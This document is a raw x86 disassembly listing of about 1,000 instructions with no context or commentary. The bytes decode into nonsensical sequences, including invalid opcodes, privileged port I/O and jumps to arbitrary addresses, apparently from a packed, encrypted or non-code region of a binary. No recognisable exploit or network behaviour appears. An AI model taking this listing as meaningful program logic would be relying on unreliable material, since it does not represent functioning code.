  40ac0f:	mov    ah,0x4c
  40ac11:	jp     0x40abe2
  40ac13:	call   0xb6062096
  40ac18:	imul   edx,DWORD PTR [ebp-0x7857276a],0x14
  40ac1f:	mov    eax,ds:0x7db2a9e9
  40ac24:	push   esi
  40ac25:	test   ch,0x3c
  40ac28:	mov    ds:0x296101c8,al
  40ac2d:	ds aad 0x22
  40ac30:	into   
  40ac31:	jne    0x40aca8
  40ac33:	pop    ss
  40ac34:	mov    ebx,0x595f5c7
  40ac39:	pop    esp
  40ac3a:	mov    ebx,0x6f24b1f6
  40ac3f:	ds cmp al,ah
  40ac42:	mov    edi,0xfe903c7d
  40ac47:	es hlt 
  40ac49:	cwde   
  40ac4a:	xor    eax,0xb82e530a
  40ac4f:	add    ah,BYTE PTR [esi-0x77a7cb29]
  40ac55:	jecxz  0x40ac3e
  40ac57:	enter  0x15c9,0x71
  40ac5b:	mov    eax,0xb60ebeda
  40ac60:	xor    ch,bh
  40ac62:	jnp    0x40ac92
  40ac64:	popf   
  40ac65:	cmc    
  40ac66:	cmp    eax,0x9a0fa37e
  40ac6b:	ja     0x40ac5e
  40ac6d:	adc    ecx,DWORD PTR [ebp-0x3f1e957c]
  40ac73:	scas   al,BYTE PTR es:[edi]
  40ac74:	and    BYTE PTR [esi+0x7c],0xb7
  40ac78:	mov    edi,0x24f16dd9
  40ac7d:	cmc    
  40ac7e:	pop    esp
  40ac7f:	push   eax
  40ac80:	mov    ebp,0x30c86646
  40ac85:	lahf   
  40ac86:	dec    esp
  40ac87:	mov    ecx,0x20c83dc4
  40ac8c:	movhps QWORD PTR [ebx-0x3f],xmm4
  40ac90:	inc    ebp
  40ac91:	in     eax,dx
  40ac92:	mov    ah,0xd0
  40ac94:	mov    ebx,0xd30e1aa9
  40ac99:	dec    edx
  40ac9a:	xor    eax,0x5a44920b
  40ac9f:	mov    ebp,0x16e406a5
  40aca4:	jae    0x40acfe
  40aca6:	(bad)  
  40aca7:	sbb    bh,BYTE PTR [eax-0x24b1f1f2]
  40acad:	push   es
  40acae:	or     dh,ch
  40acb0:	repz xrelease mov DWORD PTR [edi-0x7fad238c],edx
  40acb8:	ins    DWORD PTR es:[edi],dx
  40acb9:	mov    ecx,0xd00a6614
  40acbe:	dec    ebx
  40acbf:	loopne 0x40accb
  40acc1:	shr    bh,0xea
  40acc4:	in     eax,dx
  40acc5:	cld    
  40acc6:	mov    edi,0x91ab318f
  40accb:	add    dl,BYTE PTR [ecx+0x5d]
  40acce:	dec    edi
  40accf:	push   ds
  40acd0:	shl    DWORD PTR [ecx],1
  40acd2:	jle    0x40ad39
  40acd4:	and    DWORD PTR [esi],eax
  40acd6:	retf   
  40acd7:	sbb    eax,0xedc3185f
  40acdc:	jo     0x40acd5
  40acde:	mov    ds:0xb6a2a377,al
  40ace3:	and    al,BYTE PTR gs:[ecx+0x22]
  40ace7:	test   ebp,edx
  40ace9:	ret    
  40acea:	mov    cl,0xb
  40acec:	lods   al,BYTE PTR ds:[esi]
  40aced:	rcr    DWORD PTR [ecx-0x3220e856],1
  40acf3:	and    eax,DWORD PTR [esi-0x44fa7f15]
  40acf9:	ins    BYTE PTR es:[edi],dx
  40acfa:	dec    ebp
  40acfb:	ins    BYTE PTR es:[edi],dx
  40acfc:	adc    eax,0x13965e46
  40ad01:	mov    bh,0xf9
  40ad03:	ret    0xc2e9
  40ad06:	ds dec edi
  40ad08:	jbe    0x40ad68
  40ad0a:	call   0x26bad4fa
  40ad0f:	or     eax,0x9961daed
  40ad14:	int    0xbc
  40ad16:	push   cs
  40ad17:	imul   ebx,DWORD PTR [ecx+ebp*4-0x69df1649],0xe0c5cb3c
  40ad22:	jmp    0x40ad3f
  40ad24:	out    0x6f,eax
  40ad26:	dec    esp
  40ad27:	or     eax,0xc8b3689b
  40ad2c:	pop    ss
  40ad2d:	jb     0x40ad76
  40ad2f:	retf   0x454c
  40ad32:	inc    edx
  40ad33:	push   eax
  40ad34:	in     eax,dx
  40ad35:	sub    al,0xb5
  40ad37:	push   ebx
  40ad38:	lea    ebx,[edx]
  40ad3a:	or     DWORD PTR ds:0x25aac125,0xc5318620
  40ad44:	push   ecx
  40ad45:	and    al,0xf4
  40ad47:	add    eax,0x960bc08f
  40ad4c:	push   esi
  40ad4d:	pop    ebx
  40ad4e:	push   0x1d092bac
  40ad53:	push   esi
  40ad54:	lock lds esp,FWORD PTR [edx]
  40ad57:	fucomi st,st(2)
  40ad59:	ins    BYTE PTR es:[edi],dx
  40ad5a:	or     edi,esp
  40ad5c:	das    
  40ad5d:	test   eax,0x62631c3c
  40ad62:	jmp    0x3c52:0x9f56bf87
  40ad69:	(bad)  
  40ad6a:	dec    ebx
  40ad6b:	add    esi,DWORD PTR [eax+0x1e]
  40ad6e:	xor    esp,DWORD PTR [edx-0x50]
  40ad71:	jecxz  0x40ad95
  40ad73:	aam    0xe1
  40ad75:	sub    edx,esi
  40ad77:	jns    0x40adbe
  40ad79:	sub    al,0xb6
  40ad7b:	or     al,0xbd
  40ad7d:	add    eax,ebx
  40ad7f:	ss cld 
  40ad81:	imul   ebx,DWORD PTR [edx-0x11007a8d],0xffffffc1
  40ad88:	pop    ss
  40ad89:	mov    ah,0x49
  40ad8b:	mov    bl,0xe7
  40ad8d:	dec    ebx
  40ad8e:	push   ds
  40ad8f:	jbe    0x40ad74
  40ad91:	adc    dl,cl
  40ad93:	mov    ch,0x7a
  40ad95:	mov    bl,BYTE PTR [esi+esi*4-0x63]
  40ad99:	mov    ah,0x4c
  40ad9b:	add    ah,BYTE PTR [ecx-0x32]
  40ad9e:	inc    ebp
  40ad9f:	stos   DWORD PTR es:[edi],eax
  40ada0:	xlat   BYTE PTR ds:[ebx]
  40ada1:	adc    eax,0x6bf65b44
  40ada6:	clc    
  40ada7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ada8:	fwait
  40ada9:	jg     0x40ad86
  40adab:	push   es
  40adac:	mov    ebx,DWORD PTR [ecx-0x59d1f317]
  40adb2:	dec    ebp
  40adb3:	imul   edi,DWORD PTR [edi-0x12987435],0xfb022706
  40adbd:	or     ebp,DWORD PTR [ebx+0x2]
  40adc0:	repz out dx,al
  40adc2:	push   es
  40adc3:	inc    ebx
  40adc4:	stos   BYTE PTR es:[edi],al
  40adc5:	mov    al,ds:0xfa2861f3
  40adca:	dec    esp
  40adcb:	scas   al,BYTE PTR es:[edi]
  40adcc:	sbb    DWORD PTR [ebp+0x74],ebp
  40adcf:	fstp   st(6)
  40add1:	in     eax,dx
  40add2:	in     eax,0xba
  40add4:	aad    0xe5
  40add6:	mov    ah,bh
  40add8:	out    dx,al
  40add9:	mov    bh,0x12
  40addb:	push   es
  40addc:	cli    
  40addd:	mov    esi,0xd56e597d
  40ade2:	xor    BYTE PTR ds:0xc5de7dbd,0xb1
  40ade9:	scas   eax,DWORD PTR es:[edi]
  40adea:	mov    bl,0x8d
  40adec:	cmc    
  40aded:	ss test eax,0x747481f7
  40adf3:	js     0x40ae4d
  40adf5:	mov    ah,0xc0
  40adf7:	aaa    
  40adf8:	adc    edx,DWORD PTR [esi-0x3d]
  40adfb:	aad    0xca
  40adfd:	and    ch,dl
  40adff:	xlat   BYTE PTR ds:[ebx]
  40ae00:	(bad)  
  40ae01:	cs sub edi,esp
  40ae04:	mov    dl,0xf7
  40ae06:	inc    ecx
  40ae07:	mov    ebx,0xc6fbc00f
  40ae0c:	and    esp,DWORD PTR [ecx]
  40ae0e:	fnsave [edx-0x17]
  40ae11:	lea    edi,[edi+0x77]
  40ae14:	js     0x40aded
  40ae16:	inc    edx
  40ae17:	pop    edi
  40ae18:	fidiv  DWORD PTR [edi+0x26]
  40ae1b:	adc    al,0x2a
  40ae1d:	in     al,dx
  40ae1e:	mov    dl,0x53
  40ae20:	mov    ebp,ecx
  40ae22:	jns    0x40ae9b
  40ae24:	cmp    al,0x86
  40ae26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae27:	pop    edx
  40ae28:	sbb    ah,BYTE PTR [eax-0x6]
  40ae2b:	leave  
  40ae2c:	adc    eax,0x8e1314c4
  40ae31:	dec    esi
  40ae32:	or     ecx,edi
  40ae34:	and    ah,cl
  40ae36:	jnp    0x40aeaa
  40ae38:	push   edi
  40ae39:	jae    0x40ae7f
  40ae3b:	jl     0x40adc6
  40ae3d:	jle    0x40add1
  40ae3f:	fcom   QWORD PTR [esi]
  40ae41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae42:	imul   eax,DWORD PTR [ebp-0x74],0xffffffba
  40ae46:	cmp    esp,DWORD PTR [eax+0x74ee30e6]
  40ae4c:	cli    
  40ae4d:	pushw  ss
  40ae4f:	leave  
  40ae50:	dec    edi
  40ae51:	enter  0x1684,0xd0
  40ae55:	cmp    al,0x12
  40ae57:	(bad)  
  40ae58:	loopne 0x40aebd
  40ae5a:	repnz pop ss
  40ae5c:	scas   eax,DWORD PTR es:[edi]
  40ae5d:	pop    ds
  40ae5e:	jle    0x40ae01
  40ae60:	fcomp  DWORD PTR [edx]
  40ae62:	nop
  40ae63:	fcmovnu st,st(1)
  40ae65:	cmc    
  40ae66:	mov    esp,0x2f75d18
  40ae6b:	jg     0x40ae2d
  40ae6d:	call   0x445ded81
  40ae72:	clc    
  40ae73:	dec    esp
  40ae74:	sub    DWORD PTR [esi-0x7c],edi
  40ae77:	inc    ecx
  40ae78:	sub    al,0xd0
  40ae7a:	cmp    al,0xea
  40ae7c:	pop    ds
  40ae7d:	sub    edx,esp
  40ae7f:	mov    ebx,0xcc680f1f
  40ae84:	fnsave [ebx+0x35c7e09b]
  40ae8a:	gs loop 0x40ae78
  40ae8d:	jnp    0x40ae52
  40ae8f:	popf   
  40ae90:	inc    ebp
  40ae91:	aad    0xe3
  40ae93:	faddp  st(7),st
  40ae95:	and    DWORD PTR [ebp+0x15],edi
  40ae98:	or     DWORD PTR [eax+0x305dc20f],0xffffffaa
  40ae9f:	xchg   ecx,eax
  40aea0:	int3   
  40aea1:	shr    ecx,1
  40aea3:	data16 fcom DWORD PTR [esi-0x27]
  40aea7:	mov    ds:0x401471f0,eax
  40aeac:	iret   
  40aead:	scas   al,BYTE PTR es:[edi]
  40aeae:	loopne 0x40aea2
  40aeb0:	fcmovnb st,st(7)
  40aeb2:	ja     0x40aed2
  40aeb4:	mov    cl,bl
  40aeb6:	inc    ecx
  40aeb7:	das    
  40aeb8:	mov    bh,0xa8
  40aeba:	xor    al,0x76
  40aebc:	pop    ss
  40aebd:	call   0x9b92f316
  40aec2:	fwait
  40aec3:	lods   eax,DWORD PTR ds:[esi]
  40aec4:	int    0x57
  40aec6:	dec    esp
  40aec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec8:	int3   
  40aec9:	mov    ds:0xe3bb9834,eax
  40aece:	adc    ebx,DWORD PTR [esi]
  40aed0:	icebp  
  40aed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed2:	mov    eax,0x90f2a551
  40aed7:	out    0x17,eax
  40aed9:	push   ecx
  40aeda:	jg     0x40aec6
  40aedc:	push   ebx
  40aedd:	ror    BYTE PTR es:[esi+0x6638a241],cl
  40aee4:	scas   eax,DWORD PTR es:[edi]
  40aee5:	mov    esp,0x8d94e9f8
  40aeea:	sbb    ch,BYTE PTR [ebx+0x61f141bf]
  40aef0:	or     ecx,ebp
  40aef2:	mov    al,0xfc
  40aef4:	fwait
  40aef5:	mov    ebp,0xf07fd48d
  40aefa:	jmp    0xc69a389e
  40aeff:	mov    esp,0x4b182a89
  40af04:	repz repz fbld TBYTE PTR [edx-0x1a818397]
  40af0c:	pop    ds
  40af0d:	and    ebp,DWORD PTR [ecx]
  40af0f:	shl    dh,0xab
  40af12:	gs das 
  40af14:	add    al,0xc0
  40af16:	push   ebx
  40af17:	dec    edi
  40af18:	sub    eax,0xda028d1b
  40af1d:	sub    BYTE PTR [esi+ebp*8-0xc49ced],dh
  40af24:	in     eax,dx
  40af25:	bound  eax,QWORD PTR [edi-0x4b]
  40af28:	pop    esi
  40af29:	mov    edi,0x90a6e6fe
  40af2e:	leave  
  40af2f:	imul   esp,DWORD PTR [ebp+0x69],0x60
  40af33:	pop    ds
  40af34:	loope  0x40aed9
  40af36:	cwde   
  40af37:	imul   esp
  40af39:	jo     0x40af3d
  40af3b:	jne    0x40afa5
  40af3d:	jne    0x40af7e
  40af3f:	dec    ecx
  40af40:	aad    0x8d
  40af42:	stc    
  40af43:	sub    dl,BYTE PTR [edx]
  40af45:	dec    esp
  40af46:	mov    DWORD PTR [esi+0x29],ecx
  40af49:	jne    0x40aee0
  40af4b:	mov    cl,0x97
  40af4d:	inc    ebp
  40af4e:	mov    esi,0x8788627b
  40af53:	hlt    
  40af54:	or     DWORD PTR [ecx+0x9e19ec7],0x6c
  40af5b:	imul   eax,DWORD PTR [edi],0x2833fcc2
  40af61:	ds push edx
  40af63:	(bad)  
  40af64:	cmp    BYTE PTR [eax+0x69153245],0x69
  40af6b:	mov    gs,WORD PTR [esi]
  40af6d:	mov    al,ds:0xe90645a2
  40af72:	mov    BYTE PTR [edi-0x229a0b62],bl
  40af78:	jecxz  0x40af9b
  40af7a:	arpl   WORD PTR [ecx-0x544d70b2],si
  40af80:	mov    dl,0xc8
  40af82:	in     al,0x8
  40af84:	and    ah,BYTE PTR [edi]
  40af86:	sub    eax,0xd67212a2
  40af8b:	fsubp  st(3),st
  40af8d:	push   es
  40af8e:	(bad)  
  40af90:	jne    0x40af60
  40af92:	cmc    
  40af93:	in     al,0x99
  40af95:	jo     0x40af97
  40af97:	popf   
  40af98:	arpl   sp,sp
  40af9a:	sbb    eax,0x3364a094
  40af9f:	pop    es
  40afa0:	jg     0x40afbf
  40afa2:	cmp    cl,BYTE PTR [eax]
  40afa4:	ror    BYTE PTR [eax+0x5017e8c0],1
  40afaa:	sbb    eax,DWORD PTR [ebp-0x23]
  40afad:	jp     0x40afd2
  40afaf:	and    al,0xf6
  40afb1:	shl    BYTE PTR [ecx-0x1b],0xf6
  40afb5:	gs sbb eax,0xa2fecfc1
  40afbb:	(bad)  
  40afbc:	mov    ebp,0x6ba3ad1c
  40afc1:	stos   BYTE PTR es:[edi],al
  40afc2:	mov    esi,0xbc39706d
  40afc7:	mov    al,ds:0x1a5bff0
  40afcc:	add    dh,BYTE PTR [ebx]
  40afce:	in     al,dx
  40afcf:	in     eax,0xd4
  40afd1:	or     eax,esp
  40afd3:	test   edi,edi
  40afd5:	mov    ds:0x1e8741c3,eax
  40afda:	mov    bh,0x59
  40afdc:	pop    esp
  40afdd:	sbb    DWORD PTR [edi-0x57bd239a],ebx
  40afe3:	sahf   
  40afe4:	jb     0x40afc6
  40afe6:	mov    eax,ds:0x6575dedd
  40afeb:	ret    0x6885
  40afee:	jo     0x40afb2
  40aff0:	enter  0xdc9d,0x89
  40aff4:	pop    ebx
  40aff6:	fild   QWORD PTR [esi+edx*8+0x2c]
  40affa:	xchg   BYTE PTR ds:[edi+ecx*2+0x25],dl
  40afff:	shl    DWORD PTR [ebp-0x3c12f9a4],1
  40b005:	sub    bl,0xad
  40b008:	hlt    
  40b009:	out    0x19,eax
  40b00b:	test   eax,0xdfbef64c
  40b010:	xor    eax,0x49213e92
  40b015:	scas   al,BYTE PTR es:[edi]
  40b016:	push   ds
  40b017:	jnp    0x40afba
  40b019:	push   esi
  40b01a:	dec    esi
  40b01b:	jbe    0x40affc
  40b01d:	xchg   esi,eax
  40b01e:	loop   0x40b07d
  40b020:	ds mov al,0x3f
  40b023:	test   bh,ch
  40b025:	sub    ah,ch
  40b027:	ror    DWORD PTR [ecx],1
  40b029:	mov    edx,0x9bd0dfe0
  40b02e:	mov    ch,0x67
  40b030:	inc    BYTE PTR [eax]
  40b032:	fadd   QWORD PTR [edx+0x17872e38]
  40b038:	loope  0x40b067
  40b03a:	adc    bl,BYTE PTR [ecx+esi*4+0x57811621]
  40b041:	xor    al,0x77
  40b043:	sbb    al,0xe3
  40b045:	test   eax,0x3f4d33f2
  40b04a:	mov    al,ds:0x138db89f
  40b04f:	lods   eax,DWORD PTR ds:[esi]
  40b050:	jmp    0x58bd:0xbe959173
  40b057:	pop    esi
  40b058:	inc    eax
  40b059:	aas    
  40b05a:	cmp    ah,BYTE PTR [esi+0x37cf381a]
  40b060:	mov    bh,0x43
  40b062:	outs   dx,BYTE PTR ds:[esi]
  40b063:	ins    BYTE PTR es:[edi],dx
  40b064:	xchg   edi,eax
  40b065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b066:	adc    al,0x3d
  40b068:	xor    ebx,esp
  40b06a:	(bad)  
  40b06b:	out    dx,eax
  40b06c:	add    al,0x53
  40b06e:	daa    
  40b06f:	ret    
  40b070:	and    al,0x16
  40b072:	adc    al,0x9f
  40b074:	jne    0x40b092
  40b076:	and    BYTE PTR [eax-0x39],bh
  40b079:	lahf   
  40b07a:	popf   
  40b07b:	(bad)  
  40b07c:	push   ebp
  40b07d:	std    
  40b07e:	xor    eax,0xb84b4747
  40b083:	dec    eax
  40b084:	mov    esp,0x2fcd0b1
  40b089:	outs   dx,BYTE PTR ds:[esi]
  40b08a:	outs   dx,BYTE PTR ds:[esi]
  40b08b:	add    ecx,DWORD PTR [eax+0x13]
  40b08e:	inc    ebx
  40b08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b090:	mov    al,ds:0x83463c61
  40b095:	stos   BYTE PTR es:[edi],al
  40b096:	adc    eax,esp
  40b098:	shr    DWORD PTR [edi],1
  40b09a:	mov    eax,DWORD PTR [edx+0x5b]
  40b09d:	jecxz  0x40b0c6
  40b09f:	in     eax,0x5f
  40b0a1:	inc    edi
  40b0a2:	lock xchg ebp,ebx
  40b0a5:	test   BYTE PTR [esi],0x28
  40b0a8:	mov    ds:0x5e36acc5,al
  40b0ad:	or     DWORD PTR [edx+0x14],ecx
  40b0b0:	in     eax,0x36
  40b0b2:	xchg   esp,eax
  40b0b3:	clc    
  40b0b4:	xor    ebx,ebp
  40b0b6:	dec    edx
  40b0b7:	loope  0x40b136
  40b0b9:	daa    
  40b0ba:	in     al,0x70
  40b0bc:	jecxz  0x40b048
  40b0be:	cmc    
  40b0bf:	fcomp  st(0)
  40b0c1:	test   esp,eax
  40b0c3:	add    BYTE PTR [ecx+0xc],dh
  40b0c6:	push   edx
  40b0c7:	int    0xef
  40b0c9:	pop    edx
  40b0ca:	and    dl,BYTE PTR [edx+ecx*2]
  40b0cd:	adc    dh,bl
  40b0cf:	mov    ds:0x93c1e59,al
  40b0d4:	fnstcw WORD PTR [eax]
  40b0d6:	push   edi
  40b0d7:	aas    
  40b0d8:	xor    dl,dh
  40b0da:	cli    
  40b0db:	mov    ebp,0xcbf0b72d
  40b0e0:	shl    BYTE PTR [edx],cl
  40b0e2:	ret    0x27da
  40b0e5:	gs xchg edx,eax
  40b0e7:	cld    
  40b0e8:	test   DWORD PTR [edx-0x25],0x50ef53fc
  40b0ef:	test   al,0xf4
  40b0f1:	dec    esi
  40b0f2:	xchg   ebp,eax
  40b0f3:	push   0x875fb64f
  40b0f8:	call   0x6228:0x61ec4a6d
  40b0ff:	add    al,0x59
  40b101:	mov    edx,0x417ba2d3
  40b106:	or     BYTE PTR [edx+0x5d80b412],bh
  40b10c:	aad    0x25
  40b10e:	jg     0x40b0cf
  40b110:	and    BYTE PTR [edi+esi*8-0x52],0x9f
  40b115:	ficomp WORD PTR [ebp-0x33]
  40b118:	or     edi,eax
  40b11a:	loop   0x40b10c
  40b11c:	mov    bh,bh
  40b11e:	sbb    eax,0xcd1ba6c9
  40b123:	out    0x47,al
  40b125:	mov    bl,0x8d
  40b127:	loope  0x40b171
  40b129:	sbb    al,0xe9
  40b12b:	into   
  40b12c:	or     al,0xe7
  40b12e:	nop
  40b12f:	rcl    BYTE PTR [esi+edi*2+0x47760214],0x13
  40b137:	xlat   BYTE PTR ds:[ebx]
  40b138:	dec    ebp
  40b139:	int    0xb7
  40b13b:	jle    0x40b15c
  40b13d:	mov    cl,0x0
  40b13f:	jns    0x40b120
  40b141:	mov    ch,bh
  40b143:	ins    DWORD PTR es:[edi],dx
  40b144:	js     0x40b10a
  40b146:	dec    esp
  40b147:	and    bl,BYTE PTR [ebx]
  40b149:	push   eax
  40b14a:	ret    
  40b14b:	cmp    al,0x56
  40b14d:	mov    dl,0xd9
  40b14f:	out    0xc5,eax
  40b151:	or     DWORD PTR [edi-0x7cb1a73f],esp
  40b157:	pusha  
  40b158:	jl     0x40b138
  40b15a:	(bad)  
  40b15b:	adc    eax,0xd10bf772
  40b160:	dec    ebp
  40b161:	mov    ebp,0xf24d8cfb
  40b166:	sbb    al,0x81
  40b168:	es and al,0xca
  40b16b:	gs retf 
  40b16d:	pop    esp
  40b16e:	push   esi
  40b16f:	jne    0x40b1ca
  40b171:	mov    edx,0x1f23c21f
  40b176:	cmp    BYTE PTR [ebx],ah
  40b178:	loope  0x40b13d
  40b17a:	aam    0xe6
  40b17c:	aaa    
  40b17d:	pop    esp
  40b17e:	std    
  40b17f:	jne    0x40b182
  40b181:	push   ss
  40b182:	inc    eax
  40b183:	and    DWORD PTR [esi],edx
  40b185:	dec    ebp
  40b186:	mov    eax,ds:0xa389df56
  40b18b:	pop    ecx
  40b18c:	jl     0x40b1f9
  40b18e:	ins    BYTE PTR es:[edi],dx
  40b18f:	dec    esi
  40b190:	sbb    eax,0xeea561d0
  40b195:	fisub  DWORD PTR [eax+0x1d]
  40b198:	lahf   
  40b199:	out    0x3e,al
  40b19b:	cli    
  40b19c:	shl    BYTE PTR [ebx+eiz*1+0x53],0x7b
  40b1a1:	ret    
  40b1a2:	lods   al,BYTE PTR ds:[esi]
  40b1a3:	int3   
  40b1a4:	es xchg cl,cl
  40b1a7:	stos   DWORD PTR es:[edi],eax
  40b1a8:	mov    edx,0xbf2dc059
  40b1ad:	fimul  WORD PTR [eax-0x3f78811a]
  40b1b3:	in     eax,dx
  40b1b4:	out    dx,eax
  40b1b5:	inc    edi
  40b1b6:	fld    QWORD PTR [esi-0x2ecfadf4]
  40b1bc:	mov    eax,0xc35cdeb4
  40b1c1:	cmp    BYTE PTR [ecx+0x2d],ah
  40b1c4:	sahf   
  40b1c5:	mov    cl,0xc7
  40b1c7:	push   esp
  40b1c8:	ss cmp ecx,eax
  40b1cb:	inc    ebp
  40b1cc:	loop   0x40b199
  40b1ce:	jmp    0x40b1e8
  40b1d0:	imul   ebp,DWORD PTR [eax-0x7700d75d],0xfafd197
  40b1da:	or     eax,0xc8378
  40b1df:	push   ebx
  40b1e0:	xor    DWORD PTR [edx],ebx
  40b1e2:	dec    ecx
  40b1e3:	nop
  40b1e4:	mov    ebx,0x52b79123
  40b1e9:	pusha  
  40b1ea:	dec    ecx
  40b1eb:	xor    al,bl
  40b1ed:	or     al,0x18
  40b1ef:	fsub   QWORD PTR [edx]
  40b1f1:	arpl   WORD PTR [eax+0x70],di
  40b1f4:	sbb    eax,0xc34df467
  40b1f9:	xor    al,0x21
  40b1fb:	jecxz  0x40b23d
  40b1fd:	cs hlt 
  40b1ff:	sub    ebx,edx
  40b201:	xor    DWORD PTR ds:0x47e8a255,ebp
  40b207:	fild   WORD PTR ds:0xcdd70cd2
  40b20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b20e:	dec    eax
  40b20f:	jge    0x40b249
  40b211:	pusha  
  40b212:	packsswb mm5,QWORD PTR [ecx-0x284cc6a5]
  40b219:	scas   eax,DWORD PTR es:[edi]
  40b21a:	mov    al,BYTE PTR [ecx+0x2b846865]
  40b220:	xchg   ebx,eax
  40b221:	inc    esp
  40b222:	cmc    
  40b223:	xor    eax,0x8810341f
  40b228:	cmp    bl,BYTE PTR [ecx]
  40b22a:	adc    DWORD PTR [edi+0x13b63961],ebx
  40b230:	ins    DWORD PTR es:[edi],dx
  40b231:	sub    ecx,DWORD PTR [edi+0x3fe19592]
  40b237:	xor    BYTE PTR [eax+ebx*1],0xab
  40b23b:	mov    esp,0x4ffe23b5
  40b240:	ss or  bl,ch
  40b243:	in     al,dx
  40b244:	push   ebp
  40b245:	cmp    eax,0x47e24030
  40b24a:	or     esp,DWORD PTR [edi]
  40b24c:	fisub  DWORD PTR [ebp-0x52a084f5]
  40b252:	push   esi
  40b253:	daa    
  40b254:	lea    ecx,[edx]
  40b256:	mov    ds:0x5221208e,eax
  40b25b:	icebp  
  40b25c:	dec    esi
  40b25d:	mov    ebx,edi
  40b25f:	jne    0x40b2de
  40b261:	jg     0x40b206
  40b263:	add    BYTE PTR [ecx-0x16b9c56b],ah
  40b269:	pushf  
  40b26a:	inc    ecx
  40b26b:	repnz xchg esi,eax
  40b26d:	mov    edi,0x954c8d6b
  40b272:	ins    BYTE PTR es:[edi],dx
  40b273:	add    eax,0xd7758d80
  40b278:	pop    esp
  40b279:	adc    eax,0x6cffab56
  40b27e:	or     bl,ch
  40b280:	nop
  40b281:	sbb    eax,0xdd9d1d78
  40b286:	out    0xae,al
  40b288:	push   edx
  40b289:	adc    al,0xeb
  40b28b:	inc    edx
  40b28c:	dec    ecx
  40b28d:	mov    al,ds:0x79ade704
  40b292:	call   0xf55a8259
  40b297:	inc    esi
  40b298:	jb     0x40b25c
  40b29a:	pop    ebp
  40b29b:	aam    0x77
  40b29d:	sti    
  40b29e:	ds fwait
  40b2a0:	out    dx,al
  40b2a1:	dec    esi
  40b2a2:	xor    eax,0x3f3b21ac
  40b2a7:	and    BYTE PTR [edi+0x6b234942],dh
  40b2ad:	sub    eax,0xe2325184
  40b2b2:	repnz or DWORD PTR [eax+0x543f462f],ebx
  40b2b9:	mov    WORD PTR [ecx-0x10],ds
  40b2bc:	(bad)  
  40b2bd:	sub    al,0x30
  40b2bf:	mov    eax,0xf0856af5
  40b2c4:	sbb    edx,esp
  40b2c6:	xchg   edx,eax
  40b2c7:	jae    0x40b32f
  40b2c9:	(bad)  
  40b2ca:	mov    esi,DWORD PTR [eax+ebx*8-0x2d329ea5]
  40b2d1:	push   ss
  40b2d2:	jecxz  0x40b30e
  40b2d4:	add    eax,DWORD PTR [esi]
  40b2d6:	(bad)  
  40b2d7:	ret    0xeee7
  40b2da:	xor    eax,0x6693319b
  40b2df:	and    DWORD PTR [edi],ebp
  40b2e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e2:	jne    0x40b265
  40b2e4:	sub    bl,BYTE PTR [edx+0x62]
  40b2e7:	ja     0x40b35f
  40b2e9:	mov    ah,0x0
  40b2eb:	sbb    eax,0x5e4e43b0
  40b2f0:	and    ch,BYTE PTR [ebp+0x64]
  40b2f3:	ja     0x40b290
  40b2f5:	(bad)  [ebx+edx*2+0x2d3d3638]
  40b2fc:	ficom  WORD PTR ds:0x81f400b8
  40b302:	push   cs
  40b303:	outs   dx,DWORD PTR ds:[esi]
  40b304:	gs out 0xf3,al
  40b307:	adc    edx,DWORD PTR [ecx+edi*4-0x6c0069a]
  40b30e:	dec    edx
  40b30f:	add    dh,BYTE PTR [eax+ecx*2]
  40b312:	std    
  40b313:	shl    ebp,1
  40b315:	or     ah,BYTE PTR [eax+eiz*2+0x7d]
  40b319:	test   DWORD PTR [edx+0x4e4f8497],ecx
  40b31f:	in     al,dx
  40b320:	and    al,ch
  40b322:	in     eax,dx
  40b323:	(bad)  
  40b324:	push   ds
  40b325:	mov    cl,0xd3
  40b327:	pushf  
  40b328:	punpcklbw mm0,DWORD PTR [eax-0x15]
  40b32c:	jb     0x40b2c8
  40b32e:	jecxz  0x40b35d
  40b330:	dec    ebp
  40b331:	or     BYTE PTR [esp+eiz*4],0xdc
  40b335:	mov    ah,0x62
  40b337:	jnp    0x40b34f
  40b339:	sbb    cl,BYTE PTR [eax+eax*2]
  40b33c:	and    eax,0x3d97ee21
  40b341:	shr    dl,0x15
  40b344:	out    0x3c,al
  40b346:	pusha  
  40b347:	sub    DWORD PTR [edi+eax*8],esp
  40b34a:	imul   ebp,DWORD PTR [ebx],0x2ec0cbf2
  40b350:	jecxz  0x40b2d3
  40b352:	frstor [edx]
  40b354:	ins    DWORD PTR es:[edi],dx
  40b355:	fild   WORD PTR [esi-0x1feba76b]
  40b35b:	and    edx,esp
  40b35d:	add    dl,BYTE PTR [edi]
  40b35f:	mov    ch,0xb9
  40b361:	mov    ds:0x270a1247,eax
  40b366:	popa   
  40b367:	and    al,BYTE PTR [ebx]
  40b369:	into   
  40b36a:	push   cs
  40b36b:	nop
  40b36c:	add    al,0x7b
  40b36e:	out    dx,eax
  40b36f:	mov    eax,0x8920cc6
  40b374:	(bad)  
  40b376:	adc    eax,DWORD PTR [edx-0x21cc0bcd]
  40b37c:	mov    edi,0xb42995dc
  40b381:	mov    bl,0x58
  40b383:	pusha  
  40b384:	sub    BYTE PTR [ebp+0x13],dl
  40b387:	in     al,0x36
  40b389:	push   0x15
  40b38b:	jo     0x40b3ed
  40b38d:	fsubr  st(2),st
  40b38f:	mov    bl,0xdc
  40b391:	mov    eax,ds:0xf6fc47e7
  40b396:	out    dx,eax
  40b397:	push   ebx
  40b398:	fld    QWORD PTR [esi+0x604a313f]
  40b39e:	fisttp WORD PTR [ecx]
  40b3a0:	not    ecx
  40b3a2:	adc    DWORD PTR [ecx+0x6e],eax
  40b3a5:	jg     0x40b3bb
  40b3a7:	in     eax,dx
  40b3a8:	jae    0x40b389
  40b3aa:	pushf  
  40b3ab:	scas   eax,DWORD PTR es:[edi]
  40b3ac:	dec    edx
  40b3ad:	sahf   
  40b3ae:	ja     0x40b372
  40b3b0:	xchg   ebp,eax
  40b3b1:	daa    
  40b3b2:	aam    0x8f
  40b3b4:	mov    bl,0xdb
  40b3b6:	fimul  DWORD PTR [esi+ecx*8+0x3694a65a]
